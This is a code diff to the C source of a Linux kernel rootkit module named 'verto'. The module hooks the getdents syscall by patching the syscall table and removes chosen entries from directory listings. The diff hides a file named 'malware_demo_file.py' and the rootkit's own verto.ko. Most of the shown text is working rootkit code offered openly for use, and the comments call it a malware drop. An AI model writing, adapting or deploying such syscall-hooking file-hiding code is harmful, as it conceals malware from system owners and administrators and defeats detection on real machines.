@@ -63,19 +63,21 @@ struct linux_dirent {
 //      ------ MALWARE DROP & Verto file hides ------ //
 
 //Hardcoded malware package
-char hide[]="malware.py"; //Rename to something 'common'
+char payload[]="malware_demo_file.py"; //Rename to something 'common'
 
 // ------------------------------ //
 
 // ------- HIDE ROOTKIT FILE -------- //
 
 char ko_fl[]  = "verto.ko";
-//-- NOTES: We dont need to hide these because they are not necessary to the running of the module -- \\
-//char mod_of[] = "modules.order";
-//char mod_vf[] = "Module.symvers";
-//char mod_f[]  = "verto.mod.o";
-//char out_f[]  = "verto.o";
-//char mod_c[]  = "verto.mod.c";
+
+//-- NOTES: We dont need to hide these because they are not necessary to the running of the module -- //
+
+    //char mod_of[] = "modules.order";
+    //char mod_vf[] = "Module.symvers";
+    //char mod_f[]  = "verto.mod.o";
+    //char out_f[]  = "verto.o";
+    //char mod_c[]  = "verto.mod.c";
 
 // ------------------------------ //
 
@@ -95,6 +97,7 @@ asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dir
                 ~> displaying everything else in the 
 
     */
+  
 asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
   struct linux_dirent *retn, *dirp3; 
@@ -127,25 +130,10 @@ asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned
       Records -= length; //  dirp3->d_reclen; // leads to mistake?
     }
     */
-    if(
-            (strcmp( (dirp3->d_name) , hide) == 0) || 
-            (strcmp( (dirp3->d_name) , ko_fl) == 0) ||
-            (strcmp( (dirp3->d_name) , mod_of) == 0) ||
-            (strcmp( (dirp3->d_name) , mod_vf) == 0) ||
-            (strcmp( (dirp3->d_name) , mod_f) == 0) ||
-            (strcmp( (dirp3->d_name) , out_f) == 0) ||
-            (strcmp( (dirp3->d_name) , mod_c) == 0)
-        ){
-            memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
-            Records -= length; //  dirp3->d_reclen; // leads to mistake?
-        }
-
-    /*
-    if(strcmp( (dirp3->d_name), verto_ko_file) == 0){
+    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name) , ko_fl) == 0)){
         memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
-        Records -= length;
+        Records -= length; //  replaces dirp3->d_reclen;
     }
-    */
 
     //Shift pointer to next structure (file)
     dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);
@@ -189,7 +177,7 @@ static void __exit HookCleanup(void) {
 	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
 	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
 	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
-	printk(KERN_INFO "HooksCleaned Up!");
+	printk(KERN_INFO "Hooks cleaned up");
 }
 
 module_init(SetHooks);
